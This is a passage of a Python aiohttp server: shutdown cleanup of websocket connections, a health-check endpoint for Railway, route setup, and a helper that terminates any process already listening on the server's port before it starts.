        await cfg.aiohttp_session.close()
    # Close all WebSocket connections
    for ws in cfg.active_conns.values():
        try:
            await ws.close()
        except:
            pass
    cfg.active_conns.clear()

async def handle_health(request):
    """Health check endpoint for Railway."""
    return web.json_response({
        "status": "ok",
        "connections": len(cfg.active_conns),
        "tokens": len(cfg.access_tokens),
        "url": cfg.pub_url or "detecting..."
    })

def create_app():
    app = web.Application()

    # Routes
    app.router.add_get("/", handle_index)
    app.router.add_get("/ws", handle_ws)
    app.router.add_post("/", handle_webhook)
    app.router.add_get("/health", handle_health)

    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)

    return app

def kill_existing():
    """Kill any process on our target port."""
    port = PORT
    try:
        import psutil
        for conn in psutil.net_connections():
            if hasattr(conn, 'laddr') and conn.laddr and conn.laddr.port == port and conn.pid:
                try:
                    p = psutil.Process(conn.pid)
                    if p.pid != os.getpid():
                        log.info(f"Killing process {p.pid} on port {port}")
                        p.terminate()
                        p.wait(timeout=3)
                except:
                    pass
    except ImportError:
        # Fallback to fuser/lsof
        try:
            subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True)
        except:
            try:
                subprocess.run(["lsof", "-ti", f":{port}", "-sTCP:LISTEN"], capture_output=True)
            except:
                pass

if __name__ == "__main__":
    kill_existing()
    app = create_app()
    web.run_app(app, host="0.0.0.0", port=PORT)
